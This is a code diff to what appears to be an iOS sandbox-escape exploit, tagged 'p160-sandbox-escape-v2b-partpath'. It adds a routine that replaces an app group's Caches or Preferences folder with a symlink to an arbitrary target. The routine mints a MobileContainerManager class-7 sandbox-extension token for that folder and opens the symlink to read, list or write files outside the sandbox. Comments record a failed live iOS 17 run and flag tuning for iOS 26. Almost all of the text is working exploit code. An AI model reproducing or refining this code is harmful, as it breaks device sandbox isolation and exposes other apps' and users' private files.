@@ -27,7 +27,7 @@ extern ssize_t fsgetpath(char *buf, size_t bufsize, fsid_t *fsid, uint64_t objid
 #import <sys/stat.h>
 #import <unistd.h>
 
-#define P160_BUILD @"p160-sandbox-escape-v2-group-knobs"
+#define P160_BUILD @"p160-sandbox-escape-v2b-partpath"
 #define P160_MG_GROUP "systemgroup.com.apple.mobilegestaltcache"
 #define P160_FLAGS UINT64_C(0x8100000000)
 
@@ -430,11 +430,138 @@ static int64_t p160_class7_try(NSString *target, NSString **pathOut, NSString **
     return -1;
 }
 
+/* v2b: the class-7 escape must open the SYMLINK (partPath), not the target
+   path. The token is minted for the group's Library/{Caches,Preferences};
+   after consume, open(partPath) follows the symlink to the target, and the
+   sandbox extension is checked against the part path. The target-list helper
+   opened the target directly, which is why the live 17 run minted a Caches
+   token but failed EPERM on the target. */
+typedef NS_ENUM(int, p160_c7_mode) {
+    p160_c7_read = 0,
+    p160_c7_list = 1,
+    p160_c7_write = 2,
+};
+
+static long p160_class7_op(NSString *target, int mode, NSMutableString *o, NSString **errOut) {
+    if (!p160_load() || !g.set_ids) {
+        if (errOut) *errOut = @"MCM unavailable";
+        return -1;
+    }
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *last = @"no provisioned app group";
+    for (NSString *gid in p160_group_candidates()) {
+        NSURL *u = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
+        if (!u) continue;
+        NSString *lib = [u.path stringByAppendingPathComponent:@"Library"];
+        int major = (int)[NSProcessInfo processInfo].operatingSystemVersion.majorVersion;
+        BOOL alt = (major == 26) &&
+            [target containsString:@"/var/mobile/Containers/Shared/AppGroup"];
+        NSArray<NSNumber *> *flags = alt
+            ? @[@(UINT64_C(0x800000000)), @(UINT64_C(0x8000000000)), @(P160_FLAGS)]
+            : @[@(UINT64_C(0x8000000000)), @(UINT64_C(0x800000000)), @(P160_FLAGS)];
+        for (NSNumber *partNum in @[@3, @2]) {
+            uint64_t part = partNum.unsignedLongLongValue;
+            NSString *leaf = part == 3 ? @"Caches" : @"Preferences";
+            NSString *partPath = [lib stringByAppendingPathComponent:leaf];
+            BOOL wasDir = [fm fileExistsAtPath:partPath];
+            [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
+            if (!wasDir) {
+                [fm createDirectoryAtPath:partPath withIntermediateDirectories:NO
+                                attributes:nil error:nil];
+                wasDir = YES;
+            }
+            [fm removeItemAtPath:partPath error:nil];
+            if (symlink(target.fileSystemRepresentation,
+                        partPath.fileSystemRepresentation) != 0) {
+                last = [NSString stringWithFormat:@"symlink %@ failed errno=%d", partPath, errno];
+                g_p160_flags = P160_FLAGS;
+                p160_restore_part(partPath, wasDir);
+                continue;
+            }
+            for (NSNumber *flagNum in flags) {
+                g_p160_flags = flagNum.unsignedLongLongValue;
+                NSString *path = nil, *err = nil;
+                int64_t h = p160_query(7, gid.UTF8String, YES, part,
+                                       @"", @"class7op", &path, &err);
+                if (h >= 0) {
+                    long result = -1;
+                    int opErr = 0;
+                    if (mode == p160_c7_read) {
+                        int fd = open(partPath.fileSystemRepresentation, O_RDONLY);
+                        if (fd >= 0) {
+                            uint8_t buf[64];
+                            ssize_t n = read(fd, buf, sizeof buf);
+                            if (n > 0) {
+                                NSMutableString *hx = [NSMutableString string];
+                                for (ssize_t i = 0; i < n; i++) [hx appendFormat:@"%02x ", buf[i]];
+                                [o appendFormat:@"  [v2] path read %@ — %ld bytes @part=%@ @obj=%@\n    %@\n",
+                                    target, (long)n, partPath, path ?: @"(null)", hx];
+                                result = (long)n;
+                            }
+                            close(fd);
+                        } else {
+                            opErr = errno;
+                        }
+                    } else if (mode == p160_c7_list) {
+                        int n = 0;
+                        DIR *d = opendir(partPath.fileSystemRepresentation);
+                        if (d) {
+                            struct dirent *e;
+                            while ((e = readdir(d)) != NULL && n < 128) {
+                                if (strcmp(e->d_name, ".") == 0 || strcmp(e->d_name, "..") == 0) continue;
+                                [o appendFormat:@"    [v2] dir: %s\n", e->d_name];
+                                n++;
+                            }
+                            closedir(d);
+                            opErr = 0;
+                        } else {
+                            opErr = errno;
+                        }
+                        [o appendFormat:@"  [v2] dir %@ — %d entries @part=%@ @obj=%@\n",
+                            target, n, partPath, path ?: @"(null)"];
+                        result = (opErr == 0) ? n : -1;
+                    } else {
+                        int fd = open(partPath.fileSystemRepresentation,
+                                      O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                        long wrote = -1;
+                        if (fd >= 0) {
+                            const char *msg = "p160 group write probe\n";
+                            ssize_t w = write(fd, msg, strlen(msg));
+                            if (w > 0) { fsync(fd); wrote = (long)w; }
+                            opErr = errno;
+                            close(fd);
+                        } else {
+                            opErr = errno;
+                        }
+                        [o appendFormat:@"  [v2] write %@ — write=%ld errno=%d @part=%@ @obj=%@\n",
+                            target, wrote, opErr, partPath, path ?: @"(null)"];
+                        result = wrote;
+                    }
+                    if (g.release) g.release(h);
+                    g_p160_flags = P160_FLAGS;
+                    p160_restore_part(partPath, wasDir);
+                    if (result >= 0) return result;
+                    [o appendFormat:@"  [v2] part %@ flag=0x%llx errno=%d\n",
+                        partPath, (unsigned long long)flagNum.unsignedLongLongValue, opErr];
+                    last = [NSString stringWithFormat:@"part=%@ errno=%d", partPath, opErr];
+                    continue;
+                }
+                if (err.length) last = err;
+            }
+            g_p160_flags = P160_FLAGS;
+            p160_restore_part(partPath, wasDir);
+        }
+    }
+    [o appendFormat:@"  [v2] miss %@ err=%@\n", target, last];
+    if (errOut) *errOut = last;
+    return -1;
+}
+
 /* v2: app-group class-7 knobs. The provisioned app group is the key; the
    class-7 token is a sandbox extension for the group path and the part
    symlink redirects it to the target. Default is read-only; the write knob is
    opt-in and restricted to /var/mobile. The VFS uid/gid still applies. */
-static long p160_class7_read(NSString *target, NSMutableString *o, NSString **errOut) {
+static long __attribute__((unused)) p160_class7_read(NSString *target, NSMutableString *o, NSString **errOut) {
     NSString *path = nil, *err = nil;
     int64_t h = p160_class7_try(target, &path, &err);
     if (h < 0) {
@@ -462,7 +589,7 @@ static long p160_class7_read(NSString *target, NSMutableString *o, NSString **er
     return got;
 }
 
-static int p160_class7_list(NSString *dir, NSMutableString *o, NSString **errOut) {
+static int __attribute__((unused)) p160_class7_list(NSString *dir, NSMutableString *o, NSString **errOut) {
     NSString *path = nil, *err = nil;
     int64_t h = p160_class7_try(dir, &path, &err);
     if (h < 0) {
@@ -486,7 +613,7 @@ static int p160_class7_list(NSString *dir, NSMutableString *o, NSString **errOut
     return n;
 }
 
-static long p160_class7_write(NSString *target, NSMutableString *o, NSString **errOut) {
+static long __attribute__((unused)) p160_class7_write(NSString *target, NSMutableString *o, NSString **errOut) {
     if (!p160_load() || !g.set_ids) {
         if (errOut) *errOut = @"MCM unavailable";
         return -1;
@@ -740,12 +867,12 @@ static void p160_pathleak(NSString *prefix, uint64_t maxInode, NSMutableString *
             [docs stringByAppendingPathComponent:@"p160_path.txt"]
             encoding:NSUTF8StringEncoding error:nil]
             stringByTrimmingCharactersInSet:ws];
-        if (p.length) (void)p160_class7_read(p, o, NULL);
+        if (p.length) (void)p160_class7_op(p, p160_c7_read, o, NULL);
         NSString *dr = [[NSString stringWithContentsOfFile:
             [docs stringByAppendingPathComponent:@"p160_dir.txt"]
             encoding:NSUTF8StringEncoding error:nil]
             stringByTrimmingCharactersInSet:ws];
-        if (dr.length) (void)p160_class7_list(dr, o, NULL);
+        if (dr.length) (void)p160_class7_op(dr, p160_c7_list, o, NULL);
         NSString *wr = [[NSString stringWithContentsOfFile:
             [docs stringByAppendingPathComponent:@"p160_write_target.txt"]
             encoding:NSUTF8StringEncoding error:nil]
@@ -754,7 +881,7 @@ static void p160_pathleak(NSString *prefix, uint64_t maxInode, NSMutableString *
             if (!([wr hasPrefix:@"/var/mobile/"] || [wr hasPrefix:@"/private/var/mobile/"])) {
                 [o appendFormat:@"  [v2] write refused %@ (target must be under /var/mobile)\n", wr];
             } else {
-                (void)p160_class7_write(wr, o, NULL);
+                (void)p160_class7_op(wr, p160_c7_write, o, NULL);
             }
         }
     }
